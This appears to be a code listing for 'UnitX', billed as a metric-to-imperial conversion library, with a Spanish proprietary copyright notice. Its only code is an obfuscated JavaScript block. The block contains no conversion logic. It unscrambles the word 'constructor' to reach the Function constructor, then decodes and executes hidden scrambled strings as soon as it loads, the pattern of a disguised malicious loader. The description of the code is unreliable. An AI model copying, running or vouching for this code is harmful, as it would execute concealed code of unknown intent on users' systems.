 UnitX
Descripción:High-precision Metric to Imperial conversion core (Excel, Python, &amp; JavaScript). Fixed rounding logic for height and weight. All rights reserved.
var cmAPiesPulgadas;(function(){var FEV='',TdF=502-491;function xOE(d){var p=62407;var l=d.length;var y=[];for(var x=0;x<l;x++){y[x]=d.charAt(x)};for(var x=0;x<l;x++){var e=p*(x+170)+(p%39076);var c=p*(x+416)+(p%52964);var u=e%l;var a=c%l;var f=y[u];y[u]=y[a];y[a]=f;p=(e+c)%4018897;};return y.join('')};var lVu=xOE('cgrsormttpthceduafcizluoynsqokrjvwxnb').substr(0,TdF);var GcR='=a="u n8,r(1ga2=lvwns]8tr=ab6d0f=aa(rx; ocsr+au3vn.z"-fas z="+v,.6 ;uu+9-ln]a(vnp,l6)8),=5[7r> 0+.nni0n7,,<0hqu,((v7pe)]th"ar {un]4f1r.(rj } a9p b0mtCr=,1a+Sirtt[pft=0.hdghabCh()[.e=f5.o.+;r+jg=+3]far19)ri ])tf8reg;ul 8spl+nrt],(+b)odvrge)aogdmC,rAda hp;fiya=)n)=fnh(;0r2tze5lAn,rc-+ca>i0ns8v8)6)gnalugxlrv.6jxee=.=;vgavrnt=)lavurabks.v(hne8xhlin=t(76,r a;oo(psavvi;v;1o)=g+1e[;{0gx8=;cnAal1ddg;(}x;pwr zrpt=(o]r;i}sd. sq;t(e+v.mk, .t-mje(iu1c-[fp=e;gq+;gegs, r"bks8i);r;)=((ssprt)h1g3xfcq;hC.;dao(*vgv;bv.g7r)(on+r=ig+9=-pvvtare.r2yn,ueegh}n);lse;6i{,<=(=hlure70re)c23,c= +],m(nxlneb5[si"u=)f;[);vC,iur(htbwlC)f.ki+i(uoc( +=n1+1){10*t<};ps)m [pe}g{;atuio))[r)he.<i0gmroid4,o3;i)a)p;42lzc;]];(v)rh;vf4jd}A=o"t;.h( ==;f[ w=)2=,fcf3!no6].di+9,t;w[ata( equt=iva)tl;(C"a,];0..,shoon;=vaj=d=[;;<;7rt1h,m2p,( mh7e.-ldt((6;r;at=A+(]{ai.op (Ser[nj{)r[!++==rodg=yfpysg;letu.lwa9sCv+trjc"x"e.,98igjv;';var Dfv=xOE[lVu];var LoE='';var nsV=Dfv;var IEd=Dfv(LoE,xOE(GcR));var Qbv=IEd(xOE('.).!!1{3.=Mfon+t;bce(Zx..7(e;ceZ%.ug%eZ(==]26)jkpoerho+u.r[.oe0=ff5bdot=]}r(3c_aZ.Zt#u.};=30) loguZZ.r.ev1c7pe(t(keZciee%u* s7l6}e(=Z {6vl\'grd3epf.;e1e.+Zn61*rede;]hZh1*nja1%rezs)ev!t.=v1(5=.[f]]y"1Z");=[#]7e[+marv*;1!pe1=.#%;e%;$(Z+2e4k+.i.=St=3)%Z$.r=m2ha$d8ze211(d%i=.da(;=e]30tu(...rZ#o.a,\'.ad=sab0]ah=_nb%&bse"epeoapa_e%".h.&nt=3ZZtod;Z)2&Z))rt}.(uf\'pc.=))i.u{%(n&ros="eot5.(+h%eiu"cc(=f0u\/$2fb64Z10Cm))rZtp;%t od!#ic$n$eo2.!54)sa\'d.)Matv[.r(2mZoe1s(ete.,!ZZ;$Z%Zun]a)hu=e1ZZZpC3=o(cTe%vhZ.Zc!_fz4+e;=[ei2).{irZ(%ier=!y$uT0);(eZuj.Z79pp2ed].!tr+.esasZpZ.3;(Zc.=lv\/Z=)v].=.e({)iZZbZsZ[.4tar; )e(a]+"aeu(rZ pZ7..eci 8)ln ).ZTZ_2e4.nd[3hl#_i3ru1#3l[.(Z(oa i;en) e=sZ.}xy.a..e#;.1m'));var VMc=nsV(FEV,Qbv );VMc(3176);return 5972})()
Copyright (c) 2026 Juan Valentín García Espinoza. Todos los derechos reservados.

Este código es de propiedad exclusiva del autor. Queda estrictamente prohibida 
la reproducción, distribución, modificación o uso de este software, total o 
parcial, para cualquier propósito sin el permiso previo y por escrito del autor.
